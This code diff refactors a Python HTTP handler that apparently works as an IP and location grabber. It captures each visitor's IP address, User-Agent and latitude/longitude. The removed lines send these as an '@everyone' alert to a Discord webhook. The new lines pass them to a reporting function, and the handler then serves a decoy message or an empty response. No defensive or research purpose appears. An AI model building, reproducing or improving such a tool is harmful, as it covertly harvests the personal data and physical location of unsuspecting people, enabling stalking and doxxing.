@@ -66,44 +66,22 @@ def create_report(ip, user_agent, endpoint="/image", lat=None, lon=None):
 
 
 class handler(BaseHTTPRequestHandler):
-def do_GET(self):
-    parsed_path = urlparse(self.path)
-    query = parse_qs(parsed_path.query)
-    ip = self.client_address[0]
-    user_agent = self.headers.get('User-Agent', 'Unknown')
-    endpoint = parsed_path.path
+    def do_GET(self):
+        parsed_path = urlparse(self.path)
+        query = parse_qs(parsed_path.query)
+        ip = self.client_address[0]
+        user_agent = self.headers.get('User-Agent', 'Unknown')
 
-    # אם זה בקשת מיקום
-    if endpoint == "/location" and "lat" in query and "lon" in query:
-        lat = query["lat"][0]
-        lon = query["lon"][0]
-        location_embed = {
-            "username": config["username"],
-            "content": "@everyone",
-            "embeds": [{
-                "title": "📍 Location Data",
-                "color": config["color"],
-                "description": f"""
-**IP:** {ip}
-**Lat:** {lat}
-**Lon:** {lon}
-**User-Agent:** {user_agent}
-                """
-            }]
-        }
-        send_log_to_discord(location_embed)
-        self.send_response(200)
-        self.end_headers()
-        return
+        lat = query.get("lat", [None])[0]
+        lon = query.get("lon", [None])[0]
 
-    # דוח רגיל על IP
-    create_report(ip, user_agent, endpoint)
+        create_report(ip, user_agent, parsed_path.path, lat, lon)
 
-    if config["showMessage"]:
-        self.send_response(200)
-        self.send_header('Content-type', 'text/html; charset=utf-8')
-        self.end_headers()
-        self.wfile.write(open("index.html", encoding="utf-8").read().encode("utf-8"))
-    else:
-        self.send_response(204)
-        self.end_headers()
+        if config["showMessage"]:
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            self.wfile.write(config["messageText"].encode())
+        else:
+            self.send_response(204)
+            self.end_headers()
